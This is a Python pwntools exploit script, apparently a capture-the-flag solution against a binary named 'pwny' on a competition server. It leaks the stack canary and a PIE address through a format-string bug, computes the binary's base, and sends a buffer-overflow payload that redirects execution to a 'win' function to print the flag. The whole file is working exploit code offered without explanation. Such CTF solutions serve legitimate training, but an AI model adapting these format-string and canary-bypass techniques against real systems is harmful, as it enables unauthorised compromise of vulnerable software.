#!/usr/bin/env python3 
from pwn import *

# Set up the binary and context
binary = './pwny'
elf = ELF(binary)
context.binary = binary

PIE_OFFSET = 0x20f0
CANARY_BUFFER_OFFSET = 72

#p = process(binary)
p = remote('kubenode.mctf.io', 30012)

p.recvuntil(b'positive energy')
p.sendline(b'%19$p-%6$p^')
leaks = p.recvuntil(b'!')

canary = int(leaks.split(b'-')[0].split()[-1], 16)
log.success(f'Leaked canary: {hex(canary)}')

leaked_pie = int(int(leaks.split(b'-')[1].split(b'^')[0], 16))
log.success(f'Leaked pie address: {hex(leaked_pie)}')

base_address = leaked_pie - PIE_OFFSET
elf.address = base_address
log.success(f"Base pie address: {hex(base_address)}")

payload = flat(
    b"A" * CANARY_BUFFER_OFFSET,  # Overflow buffer
    p64(canary),                  # Canary value
    b"B" * 8,                     # Padding to reach return address
    elf.symbols.win
)

p.sendline(payload)
print(p.recvall().split(b'Flag: ')[1].strip())
